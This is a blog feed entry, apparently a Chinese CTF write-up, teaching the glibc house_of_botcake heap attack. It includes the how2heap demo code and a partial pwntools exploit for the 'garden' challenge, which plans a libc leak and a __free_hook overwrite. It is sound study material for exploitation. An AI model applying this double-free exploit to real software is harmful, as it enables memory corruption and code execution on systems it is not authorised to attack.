<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>lexsd6&#39;s home</title>
  
  <subtitle> Clumsy birds have to start flying early</subtitle>
  <link href="lexsd6.github.io/atom.xml" rel="self"/>
  
  <link href="lexsd6.github.io/"/>
  <updated>2022-06-15T14:54:52.695Z</updated>
  <id>lexsd6.github.io/</id>
  
  <author>
    <name>lexsd6</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>how2heap-house_of_botcake-学习</title>
    <link href="lexsd6.github.io/2022/06/15/how2heap-house_of_botcake-%E5%AD%A6%E4%B9%A0/"/>
    <id>lexsd6.github.io/2022/06/15/how2heap-house_of_botcake-%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-06-15T01:54:13.592Z</published>
    <updated>2022-06-15T14:54:52.695Z</updated>
    
    <content type="html"><![CDATA[<p>在2.29版本上的libc中，由于 tcache 加入了 key 值来进行 double free 检测，以至于在旧版本时的直接进行 double free 变的无效。<a id="more"></a></p><p>2.29前</p><p><img src="image-20220615114331112.png" alt="image-20220615114331112"></p><p>2.29后</p><p><img src="image-20220615114415661.png" alt="image-20220615114415661"></p><p>这个key一般是指向 manage chunk。</p><h2 id="house-of-botcake的目的、本质与条件"><a href="#house-of-botcake的目的、本质与条件" class="headerlink" title="house_of_botcake的目的、本质与条件"></a>house_of_botcake的目的、本质与条件</h2><p>目的：</p><p>在2.29版本上的libc中，制造堆块重叠。</p><p>本质：</p><p>利用的本质是让 chunk 在 <strong>unsorted bin</strong> 和 <strong>tcache</strong> 中同时存在，从而造成 UAF 可以修改 key 的内容。</p><p>条件:</p><p>1.我们能够控制已经free的chunk进行，再次free.(double free の变种)。</p><p>2.能填满tcache ，得到 unsorted bin。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NX：-z execstack &#x2F; -z noexecstack (关闭 &#x2F; 开启) 不让执行栈上的数据，于是JMP ESP就不能用了</span><br><span class="line">Canary：-fno-stack-protector &#x2F;-fstack-protector &#x2F; -fstack-protector-all (关闭 &#x2F; 开启 &#x2F; 全开启) 栈里插入cookie信息</span><br><span class="line">PIE：-no-pie &#x2F; -pie (关闭 &#x2F; 开启) 地址随机化，另外打开后会有get_pc_thunk</span><br><span class="line">RELRO：-z norelro &#x2F; -z lazy &#x2F; -z now (关闭 &#x2F; 部分开启 &#x2F; 完全开启) 对GOT表具有写权限</span><br></pre></td></tr></table></figure><h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.32-2.34</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"This file demonstrates a powerful tcache poisoning attack by tricking malloc into"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"returning a pointer to an arbitrary location (in this demo, the stack)."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"This attack only relies on double free.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"The address we want malloc() to return, namely,"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"the target address is %p.\n\n"</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Preparing heap layout"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later."</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Allocating a chunk for later consolidation: prev @ %p\n"</span>, prev);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Allocating the victim chunk: a @ %p\n"</span>, a);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating a padding to prevent consolidation.\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now we are able to cause chunk overlapping"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 1: fill up tcache list"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 2: free the victim chunk so it will be added to unsorted bin"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 3: free the previous chunk and make it consolidate with the victim chunk."</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now we have the chunk overlapping primitive:"</span>);</span><br><span class="line">    <span class="keyword">int</span> prev_size = prev[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    <span class="keyword">int</span> a_size = a[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"prev @ %p, size: %#x, end @ %p\n"</span>, prev, prev_size, (<span class="keyword">void</span> *)prev+prev_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"victim @ %p, size: %#x, end @ %p\n"</span>, a, a_size, (<span class="keyword">void</span> *)a+a_size);</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">    prev[<span class="number">0x110</span>/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>)] = <span class="number">0x41414141</span>;</span><br><span class="line">    assert(a[<span class="number">0</span>] == <span class="number">0x41414141</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，我们分配了7个chunk来为以后填满tcache做准备：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">    x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再准备用于攻击的两个chunk，和隔离的chunk。其中a chunk 是我们将要 double free的chunk，prev chunk 是将用于辅助uaf的chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocating a chunk for later consolidation: prev @ %p\n"</span>, prev);</span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocating the victim chunk: a @ %p\n"</span>, a);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Allocating a padding to prevent consolidation.\n"</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br></pre></td></tr></table></figure><p>之后，我们再释放掉a chunk  和prev chunk ，由于tachebins 满了，a chunk 和prev chunk 将加入 unsortedbin中。同时由于a chunk 和prev chunk 相邻，a chunk 和prev chunk 将合并成为一个大的chunk 放入 unsortedbin。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Step 2: free the victim chunk so it will be added to unsorted bin"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Step 3: free the previous chunk and make it consolidate with the victim chunk."</span>);</span><br><span class="line"><span class="built_in">free</span>(prev);</span><br></pre></td></tr></table></figure><p>这时，我们从tachebins中取出一个chunk：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure><p>这样我们tachebins中就只有6个 chunk了，这时我们再free a chunk。由于tachebins未满，所以我们的a chunk将会加入tachebins中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"><span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line"><span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Now we have the chunk overlapping primitive:"</span>);</span><br><span class="line"><span class="keyword">int</span> prev_size = prev[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line"><span class="keyword">int</span> a_size = a[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"prev @ %p, size: %#x, end @ %p\n"</span>, prev, prev_size, (<span class="keyword">void</span> *)prev+prev_size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"victim @ %p, size: %#x, end @ %p\n"</span>, a, a_size, (<span class="keyword">void</span> *)a+a_size);</span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">prev[<span class="number">0x110</span>/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>)] = <span class="number">0x41414141</span>;</span><br><span class="line">assert(a[<span class="number">0</span>] == <span class="number">0x41414141</span>);</span><br></pre></td></tr></table></figure><p><img src="image-20220615102654063.png" alt="image-20220615102654063"></p><p>于是，a chunk即在tachebins中，又和prev chunk一起在 unsortedbin 中。这样我们就完成house_of_botcake攻击。可以进而通过prev chunk 用 A chunk进行任意地址写。 </p><h2 id="例题解析-祥云杯2020-garden"><a href="#例题解析-祥云杯2020-garden" class="headerlink" title="例题解析-祥云杯2020-garden"></a>例题解析-祥云杯2020-garden</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><img src="image-20220615221726509.png" alt="image-20220615221726509"></p><p>题目保护全开，同时是2.31版本。</p><p>分析流程，发现题目只有添加chunk，释放，显示内容，退出四种功能。</p><p>但用两种添加chunk和释放chunk的功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"tree index?"</span>);</span><br><span class="line">  v1 = sub_11C5();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">8</span> || qword_4060[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"invalid index"</span>);</span><br><span class="line">  qword_4060[v1] = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"tree name?"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)qword_4060[v1], <span class="number">0x100</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很平凡的添加功能，但只能申请0x100大小空间的chunk(0x110).且只能申请8个.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_4050 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"do you want to name the garden?"</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  result = <span class="built_in">puts</span>(<span class="string">"sorry, you can't"</span>);</span><br><span class="line">  dword_4050 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只能调用一次的，添加功能但可以申请0x20大小空间的chunk（0x30）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"tree index?"</span>);</span><br><span class="line">  v2 = sub_11C5();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">8</span> &amp;&amp; qword_4060[v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_4060[v2]);</span><br><span class="line">    v0 = qword_4060;</span><br><span class="line">    qword_4060[v2] = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"invalid index"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很常见的正常释放chunk操作，再free chunk 后，会清空指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_4054 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"which tree do you want to steal?"</span>);</span><br><span class="line">  v0 = sub_11C5();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> &amp;&amp; v0 &lt;= <span class="number">8</span> &amp;&amp; qword_4060[v0] )</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_4060[v0]);</span><br><span class="line">  dword_4054 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在free chunk 后，不会清空指针。但是只能清空一次。</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>我们可以，释放8个0x100chunk,让一个chunk 加入 unsorted bin 中，再利用name()函数，让 unsorted bin 大小小于0x100 。</p><p>我们再在add 8 个0x100 chunk，这时unsorted bin (小于0x100) 也不会利用。</p><p>释放 unsorted bin 后面相邻0x100 chunk（a chunk） ,并保留指针。两个chunk 合并成大的unsorted bin</p><p> chunk。</p><p>再add 一个 0x100 chunk，让  tcache 未满，再free  a chunk 这时 a chunk进入  0x100 chunk。但同时也在于unsorted bin中。形成重叠。</p><p>再利用重叠部分uaf泄露libc，再修改fd进行任意地址写，在<code>__free_hook</code>写入后门。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/06/15 16:46:39</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./garden'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">ip_port=[<span class="string">''</span>,]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,text)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'tree index?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'tree name?'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'tree index?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_0</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'which tree do you want to steal?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'tree index?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="string">'1111'</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#free(4)</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">name()  <span class="comment">#制造0xe0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="string">'1111'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#free(2)</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span 